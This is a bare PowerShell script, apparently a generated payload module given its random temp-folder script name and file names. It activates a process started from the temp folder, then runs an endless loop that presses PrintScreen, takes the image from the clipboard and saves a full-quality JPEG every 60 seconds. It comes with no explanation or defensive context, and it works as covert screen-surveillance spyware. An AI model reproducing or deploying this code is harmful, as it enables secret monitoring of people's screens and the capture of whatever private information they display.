$proc = Get-process | Where-Object {$_.path -eq "$env:temp/SbQRViPjIq.ps1"}
[Microsoft.VisualBasic.Interaction]::AppActivate($Proc.id)
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

function Get-ScreenCapture
{
    param(    
    [Switch]$OfWindow        
    )


    begin {
        Add-Type -AssemblyName System.Drawing
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 250
        if ($OfWindow) {            
            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
        } else {
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
        }
        Start-Sleep -Milliseconds 250
        $bitmap = [Windows.Forms.Clipboard]::GetImage()    
        $ep = New-Object Drawing.Imaging.EncoderParameters  
        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
        $screenCapturePathBase = "cqTbMpzNLx"
        $c = 0
        while (Test-Path "${c}${screenCapturePathBase}.jpg") {
            $c++
        }
        $bitmap.Save("${c}cqTbMpzNLx.jpg", $jpegCodec, $ep)
    }

}

while ($true) {
    Get-ScreenCapture
    Start-Sleep -Seconds 60
}
